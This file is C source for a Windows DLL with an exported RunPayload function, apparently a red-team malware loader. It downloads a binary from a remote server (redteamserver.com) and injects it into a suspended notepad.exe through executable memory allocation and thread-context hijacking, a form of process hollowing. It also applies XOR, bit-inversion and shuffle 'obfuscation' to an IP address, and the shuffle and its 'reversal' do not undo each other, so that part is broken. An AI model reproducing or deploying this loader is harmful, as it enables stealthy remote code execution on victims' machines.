#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wininet.h>

// Exported function
__declspec(dllexport) void RunPayload() {
    char server_ip[] = {0x12, 0x34, 0x56, 0x78, 0x00}; // Encrypted IP
    char server_port[] = {0xAB, 0xCD, 0x00}; // Encrypted port
    char key[] = "ComplexKey"; // Complex key

    // XOR Encryption Function
    int dataLen = strlen(server_ip);
    int keyLen = strlen(key);
    for (int i = 0; i < dataLen; i++) {
        server_ip[i] = server_ip[i] ^ key[i % keyLen];
    }

    // Memory Obfuscation - Bit Inversion
    char *alias = server_ip;
    while (*alias) {
        *alias = ~(*alias);
        alias++;
    }

    // Memory Obfuscation - Byte Shuffling
    for (int i = 0; i < dataLen - 1; i++) {
        int j = i + rand() / (RAND_MAX / (dataLen - i) + 1);
        char temp = server_ip[j];
        server_ip[j] = server_ip[i];
        server_ip[i] = temp;
    }

    // Reverse shuffling
    for (int i = 0; i < dataLen - 1; i++) {
        int j = i + rand() / (RAND_MAX / (dataLen - i) + 1);
        char temp = server_ip[j];
        server_ip[j] = server_ip[i];
        server_ip[i] = temp;
    }

    // Reverse bit inversion
    alias = server_ip;
    while (*alias) {
        *alias = ~(*alias);
        alias++;
    }

    // Retrieve payload from web server
    HINTERNET hInternet, hConnect;
    char payloadBuffer[1024];
    DWORD bytesRead;

    hInternet = InternetOpen("UserAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet != NULL) {
        hConnect = InternetOpenUrl(hInternet, "http://redteamserver.com/payload.bin", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect != NULL) {
            InternetReadFile(hConnect, payloadBuffer, sizeof(payloadBuffer), &bytesRead);
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }

    // Create a new process in a suspended state
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    const char *targetProcess = "C:\\Windows\\System32\\notepad.exe"; // Target process for process hollowing

    if (!CreateProcess(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "Error creating process\n");
        return;
    }

    // Allocate memory within the target process for payload
    LPVOID remotePayload = VirtualAllocEx(pi.hProcess, NULL, bytesRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remotePayload) {
        fprintf(stderr, "Error allocating memory in target process\n");
        return;
    }

    // Write payload to the allocated memory
    if (!WriteProcessMemory(pi.hProcess, remotePayload, payloadBuffer, bytesRead, NULL)) {
        fprintf(stderr, "Error writing payload to target process memory\n");
        return;
    }

    // Update the target process's entry point to the payload
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_INTEGER;
    GetThreadContext(pi.hThread, &ctx);
    ctx.Eax = (DWORD)remotePayload;
    SetThreadContext(pi.hThread, &ctx);

    // Resume the suspended process, causing it to execute the payload
    ResumeThread(pi.hThread);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

